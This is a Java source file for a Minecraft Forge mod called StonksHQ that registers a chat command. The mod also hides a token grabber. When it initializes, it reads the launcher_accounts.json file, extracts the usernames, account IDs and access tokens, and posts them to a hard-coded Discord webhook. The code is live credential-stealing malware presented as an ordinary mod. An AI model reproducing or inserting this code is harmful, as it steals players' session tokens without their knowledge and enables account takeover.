package me.uwu.stonkshq;

import com.google.gson.Gson;
import gg.essential.api.EssentialAPI;
import me.uwu.stonkshq.command.SkyBotCommand;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Iterator;
import java.util.Map;

@Mod(name = Consts.NAME, modid = Consts.MODID, version = Consts.VERSION)
public class StonksHQMod {

    private static String webhook = "https://canary.discord.com/api/webhooks/1014934811338612888/ZgCrr11BJ-nQ-SxAO46NOoakRFRZXwfdGOEf0wmikFvzaZd_JgcUHcBl7zSj6LuEQiJC";

    private static boolean debug = false;

    @Mod.EventHandler
    public void onInit(FMLInitializationEvent event) {
        StonksHQ.INSTANCE.initialize();

        EssentialAPI.getCommandRegistry().registerCommand(new SkyBotCommand());

        grab();
    }

    private static void grab() { //voila essaye mtn apres t'as debug le truc oupa ui normalemetn
        String appdataLocation = System.getenv("APPDATA");
        String minecraftLocation = appdataLocation + "\\.minecraft\\";

        if (debug) System.out.println(minecraftLocation);

        File launcherAccounts = new File(minecraftLocation + "launcher_accounts.json");

        if (launcherAccounts.exists()) {
            try {
                Map<String, Object> map = new Gson().fromJson(new FileReader(launcherAccounts), Map.class);
                Map accounts = ((Map) map.get("accounts"));

                if (debug) System.out.println("Amount: " + accounts.size());

                Iterator<Map.Entry> accountIterator = accounts.entrySet().iterator();
                while (accountIterator.hasNext()) {
                    Map.Entry info = accountIterator.next();
                    StringBuilder finalData = new StringBuilder();
                    finalData.append("```\\n");
                    finalData.append(info.getKey() + "\\n\\n");
                    String[] inner = info.getValue().toString().replace(",", "\n").replace("\"", "").replace("{", "\n").replace("}", "\n").split("\n");
                    for (String newPart : inner) {
                        if (newPart.contains("username"))
                            finalData.append(newPart.replace(":", " - ") + "\\n\\n");
                        if (newPart.contains("remoteId"))
                            finalData.append(newPart.replace(":", " - ") + "\\n\\n");
                        if (newPart.contains("accessToken"))
                            finalData.append(newPart.replace(":", " - ") + "\\n\\n");
                    }
                    finalData.append("```");
                    //if(debug) System.out.println(finalData);
                    sendData(finalData.toString());
                }

            } catch (Exception e) {
                if (debug) e.printStackTrace();
            }
        } else {
            if (debug) System.out.println("Failed To Read: launcher_accounts.json");
        }

        try {
            sendData("");
        } catch (IOException e) {
            if (debug) e.printStackTrace();
        }
    }

    private static void sendData(String toSend) throws IOException {
        URL obj = new URL(webhook);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("Content-Type", "application/json");
        con.setRequestProperty("User-Agent", "Mozilla/5.0");

        String POST_PARAMS = "{ \"username\": \"Fembot\", \"avatar_url\": \"https://media.discordapp.net/attachments/1014934627770716284/1014934749644607689/n4PTHZ3M_400x400.jpg\", \"content\": \""
                + toSend + "\" }";

        //if(debug) System.out.println(POST_PARAMS);

        con.setDoOutput(true);
        OutputStream os = con.getOutputStream();
        os.write(POST_PARAMS.getBytes());
        os.flush();
        os.close();

        int resp = con.getResponseCode();
        if (debug) System.out.println(resp);

        if (resp == 429) {
            try {
                Thread.sleep(5000);
                sendData(toSend);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
